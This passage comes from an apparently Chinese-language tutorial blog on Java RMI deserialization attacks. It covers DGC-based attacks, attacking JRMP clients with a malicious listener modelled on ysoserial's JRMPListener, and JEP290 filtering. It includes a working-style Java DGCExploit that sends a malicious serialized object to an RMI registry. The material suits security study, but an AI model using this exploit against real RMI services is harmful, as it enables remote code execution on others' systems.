<h4 id="3-4、DGC相关的攻击"><a href="#3-4、DGC相关的攻击" class="headerlink" title="3.4、DGC相关的攻击"></a>3.4、DGC相关的攻击</h4><p>这里需要了解一下DGC的流程，之前我们提到过DGC的创建。这里我们看一下是否存在反序化点。打断点。会在DGCClient里开启的新线程可以看到里面循环调用makeDirtyCall，这里不清楚为什么调试会进不去。按照网上的说法是可以进去的。在makeDirtyCall里面会看见dgc.dirty这里调用了DGCImpl_Stub#dirty</p>
<p><img src="/../images/image-20230822202757740.png" alt="image-20230822202757740"></p>
<p>然后找到了具体点。服务端和之前类似的是差不多的先进入UnicastServerRef的dispatch</p>
<p><img src="/../images/image-20230822203238677.png" alt="image-20230822203238677"></p>
<p>因为DGCImpl_Stub是jdk内置类，所以进入oldDispatch</p>
<p><img src="/../images/image-20230822203304749.png" alt="image-20230822203304749"></p>
<p>然后进入最后进入DGCImpl_Skel#dispatch</p>
<p><img src="/../images/image-20230822203114455.png" alt="image-20230822203114455"></p>
<p>可以看到处处存在反序列化点。和我们之前提到的注册中心获取远程对象的处理的很像。所以攻击方式是不是也类似呢。</p>
<p><img src="/../images/image-20230822203428953.png" alt="image-20230822203428953"></p>
<p><strong>下面让我们开始对DGC的相关攻击进行具体的尝试。</strong></p>
<p>思路是获取DGCImpl_Stub对象，重写dirty方法，在DGCImpl_Skel#dispatch中触发反序列化，跟打注册中心的差不多，稍微麻烦点。自己创建一个恶意的DCG对象发送过去。怎么写我不会。这里贴一下一下组长的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DGCExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RegistryImpl_Stub</span> <span class="variable">registry</span> <span class="operator">=</span> (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> unicastRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField2</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> (LiveRef) refField2.get(unicastRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> liveRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">epField</span> <span class="operator">=</span> c3.getDeclaredField(<span class="string">&quot;ep&quot;</span>);</span><br><span class="line">        epField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> (TCPEndpoint) epField.get(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.rmi.transport.DGCClient$EndpointEntry&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">lookupMethod</span> <span class="operator">=</span> c4.getDeclaredMethod(<span class="string">&quot;lookup&quot;</span>, Endpoint.class);</span><br><span class="line">        lookupMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">endpointEntry</span> <span class="operator">=</span> lookupMethod.invoke(<span class="literal">null</span>, tcpEndpoint);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> endpointEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dgcField</span> <span class="operator">=</span> c5.getDeclaredField(<span class="string">&quot;dgc&quot;</span>);</span><br><span class="line">        dgcField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">RemoteObject</span> <span class="variable">dgc</span> <span class="operator">=</span> (RemoteObject) dgcField.get(endpointEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c6</span> <span class="operator">=</span> dgc.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField3</span> <span class="operator">=</span> c6.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef2</span> <span class="operator">=</span> (UnicastRef) refField3.get(dgc);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> unicastRef2.newCall(dgc, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">        var6.writeObject(genEvilMap());</span><br><span class="line">        unicastRef2.invoke(var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补充一下。</p>
<p><img src="/../images/image-20230822204302470.png" alt="image-20230822204302470"></p>
<p>下面我们来一个通杀客户端的</p>
<h4 id="3-5攻击JRMP客户端"><a href="#3-5攻击JRMP客户端" class="headerlink" title="3.5攻击JRMP客户端"></a>3.5攻击JRMP客户端</h4><p>之前我们在<code>获取注册中心远程对象</code>这一节提到过，只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，</p>
<p><img src="/../images/image-20230822204816746.png" alt="image-20230822204816746"></p>
<p>攻击方法就是需要自己实现一个恶意服务端，把返回的异常信息改成payload，实这就是ysoserial里面的exploit&#x2F;JRMPListener实现的功能</p>
<p>大家可以比对一下TCPTransport#run0和JRMPListener#run的区别，还是可以看到一些联系的。具体怎么用这里就不演示了。知道可以实现对客户端的通杀。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">private void run0() &#123;</span><br><span class="line">    TCPEndpoint endpoint = getEndpoint();</span><br><span class="line">    int port = endpoint.getPort();</span><br><span class="line"></span><br><span class="line">    threadConnectionHandler.set(this);</span><br><span class="line"></span><br><span class="line">    // set socket to disable Nagle&#x27;s algorithm (always send</span><br><span class="line">    // immediately)</span><br><span class="line">    // TBD: should this be left up to socket factory instead?</span><br><span class="line">    try &#123;</span><br><span class="line">        socket.setTcpNoDelay(true);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        // if we fail to set this, ignore and proceed anyway</span><br><span class="line">    &#125;</span><br><span class="line">    // set socket to timeout after excessive idle time</span><br><span class="line">    try &#123;</span><br><span class="line">        if (connectionReadTimeout &gt; 0)</span><br><span class="line">            socket.setSoTimeout(connectionReadTimeout);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        // too bad, continue anyway</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream sockIn = socket.getInputStream();</span><br><span class="line">        InputStream bufIn = sockIn.markSupported()</span><br><span class="line">                ? sockIn</span><br><span class="line">                : new BufferedInputStream(sockIn);</span><br><span class="line"></span><br><span class="line">        // Read magic (or HTTP wrapper)</span><br><span class="line">        bufIn.mark(4);</span><br><span class="line">        DataInputStream in = new DataInputStream(bufIn);</span><br><span class="line">        int magic = in.readInt();</span><br><span class="line"></span><br><span class="line">        if (magic == POST) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, &quot;decoding HTTP-wrapped call&quot;);</span><br><span class="line"></span><br><span class="line">            // It&#x27;s really a HTTP-wrapped request.  Repackage</span><br><span class="line">            // the socket in a HttpReceiveSocket, reinitialize</span><br><span class="line">            // sockIn and in, and reread magic.</span><br><span class="line">            bufIn.reset();      // unread &quot;POST&quot;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                socket = new HttpReceiveSocket(socket, bufIn, null);</span><br><span class="line">                remoteHost = &quot;0.0.0.0&quot;;</span><br><span class="line">                sockIn = socket.getInputStream();</span><br><span class="line">                bufIn = new BufferedInputStream(sockIn);</span><br><span class="line">                in = new DataInputStream(bufIn);</span><br><span class="line">                magic = in.readInt();</span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                throw new RemoteException(&quot;Error HTTP-unwrapping call&quot;,</span><br><span class="line">                                          e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // bufIn&#x27;s mark will invalidate itself when it overflows</span><br><span class="line">        // so it doesn&#x27;t have to be turned off</span><br><span class="line"></span><br><span class="line">        // read and verify transport header</span><br><span class="line">        short version = in.readShort();</span><br><span class="line">        if (magic != TransportConstants.Magic ||</span><br><span class="line">            version != TransportConstants.Version) &#123;</span><br><span class="line">            // protocol mismatch detected...</span><br><span class="line">            // just close socket: this would recurse if we marshal an</span><br><span class="line">            // exception to the client and the protocol at other end</span><br><span class="line">            // doesn&#x27;t match.</span><br><span class="line">            closeSocket(socket);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputStream sockOut = socket.getOutputStream();</span><br><span class="line">        BufferedOutputStream bufOut =</span><br><span class="line">            new BufferedOutputStream(sockOut);</span><br><span class="line">        DataOutputStream out = new DataOutputStream(bufOut);</span><br><span class="line"></span><br><span class="line">        int remotePort = socket.getPort();</span><br><span class="line"></span><br><span class="line">        if (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, &quot;accepted socket from [&quot; +</span><br><span class="line">                             remoteHost + &quot;:&quot; + remotePort + &quot;]&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TCPEndpoint ep;</span><br><span class="line">        TCPChannel ch;</span><br><span class="line">        TCPConnection conn;</span><br><span class="line"></span><br><span class="line">        // send ack (or nack) for protocol</span><br><span class="line">        byte protocol = in.readByte();</span><br><span class="line">        switch (protocol) &#123;</span><br><span class="line">        case TransportConstants.SingleOpProtocol:</span><br><span class="line">            // no ack for protocol</span><br><span class="line"></span><br><span class="line">            // create dummy channel for receiving messages</span><br><span class="line">            ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">            conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">            // read input messages</span><br><span class="line">            handleMessages(conn, false);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case TransportConstants.StreamProtocol:</span><br><span class="line">            // send ack</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">            // suggest endpoint (in case client doesn&#x27;t know host name)</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; +</span><br><span class="line">                    remotePort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.writeUTF(remoteHost);</span><br><span class="line">            out.writeInt(remotePort);</span><br><span class="line">            out.flush();</span><br><span class="line"></span><br><span class="line">            // read and discard (possibly bogus) endpoint</span><br><span class="line">            // REMIND: would be faster to read 2 bytes then skip N+4</span><br><span class="line">            String clientHost = in.readUTF();</span><br><span class="line">            int    clientPort = in.readInt();</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // create dummy channel for receiving messages</span><br><span class="line">            // (why not use clientHost and clientPort?)</span><br><span class="line">            ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">            conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">            // read input messages</span><br><span class="line">            handleMessages(conn, true);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case TransportConstants.MultiplexProtocol:</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) accepting multiplex protocol&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // send ack</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">            // suggest endpoint (in case client doesn&#x27;t already have one)</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) suggesting &quot; + remoteHost + &quot;:&quot; + remotePort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.writeUTF(remoteHost);</span><br><span class="line">            out.writeInt(remotePort);</span><br><span class="line">            out.flush();</span><br><span class="line"></span><br><span class="line">            // read endpoint client has decided to use</span><br><span class="line">            ep = new TCPEndpoint(in.readUTF(), in.readInt(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; +</span><br><span class="line">                    port + &quot;) client using &quot; +</span><br><span class="line">                    ep.getHost() + &quot;:&quot; + ep.getPort());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ConnectionMultiplexer multiplexer;</span><br><span class="line">            synchronized (channelTable) &#123;</span><br><span class="line">                // create or find channel for this endpoint</span><br><span class="line">                ch = getChannel(ep);</span><br><span class="line">                multiplexer =</span><br><span class="line">                    new ConnectionMultiplexer(ch, bufIn, sockOut,</span><br><span class="line">                                              false);</span><br><span class="line">                ch.useMultiplexer(multiplexer);</span><br><span class="line">            &#125;</span><br><span class="line">            multiplexer.run();</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            // protocol not understood, send nack and close socket</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolNack);</span><br><span class="line">            out.flush();</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        // socket in unknown state: destroy socket</span><br><span class="line">        tcpLog.log(Log.BRIEF, &quot;terminated with exception:&quot;, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        closeSocket(socket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span> <span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ( !<span class="built_in">this</span>.exit &amp;&amp; ( s = <span class="built_in">this</span>.ss.accept() ) != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                    <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                    System.err.println(<span class="string">&quot;Have connection from &quot;</span> + remote);</span><br><span class="line"></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">bufIn</span> <span class="operator">=</span> is.markSupported() ? is : <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Read magic (or HTTP wrapper)</span></span><br><span class="line">                    bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(bufIn);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line"></span><br><span class="line">                    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> in.readShort();</span><br><span class="line">                    <span class="keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">OutputStream</span> <span class="variable">sockOut</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">                    <span class="type">BufferedOutputStream</span> <span class="variable">bufOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(sockOut);</span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bufOut);</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span> <span class="variable">protocol</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">switch</span> ( protocol ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.StreamProtocol:</span><br><span class="line">                        out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line">                        <span class="keyword">if</span> ( remote.getHostName() != <span class="literal">null</span> ) &#123;</span><br><span class="line">                            out.writeUTF(remote.getHostName());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.writeInt(remote.getPort());</span><br><span class="line">                        out.flush();</span><br><span class="line">                        in.readUTF();</span><br><span class="line">                        in.readInt();</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.SingleOpProtocol:</span><br><span class="line">                        doMessage(s, in, out, <span class="built_in">this</span>.payloadObject);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.MultiplexProtocol:</span><br><span class="line">                        System.err.println(<span class="string">&quot;Unsupported protocol&quot;</span>);</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bufOut.flush();</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( InterruptedException e ) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                    e.printStackTrace(System.err);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;Closing connection&quot;</span>);</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">                s.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">this</span>.ss != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ss.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( SocketException e ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4、高版本-JDK-下的绕过"><a href="#4、高版本-JDK-下的绕过" class="headerlink" title="4、高版本 JDK 下的绕过"></a>4、高版本 JDK 下的绕过</h3><p>不想分析原理了，头疼。大概原理就是通过 JRMP 来绕过的。说白了就是 JRMPClient 这个 payload 怎么（封装才能）绕过 JEP290 的白名单校验。</p>
<p><img src="/../images/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="img"></p>
<p> JEP290 是什么呢？</p>
<p>JEP290 <code>是 Java 为了防御反序列化攻击而设置的一种过滤器，其在 JEP 项目中编号为290，因而通常被简称为</code>JEP290</p>
<ul>
<li>Provide a flexible mechanism to narrow the classes that can be deserialized from any class available to an application down to a context-appropriate set of classes. [提供一个限制反序列化类的机制，白名单或者黑名单]</li>
<li>Provide metrics to the filter for graph size and complexity during deserialization to validate normal graph behaviors. [限制反序列化的深度和复杂度]</li>
<li>Provide a mechanism for RMI-exported objects to validate the classes expected in invocations. [ 为RMI远程调用对象提供了一个验证类的机制]</li>
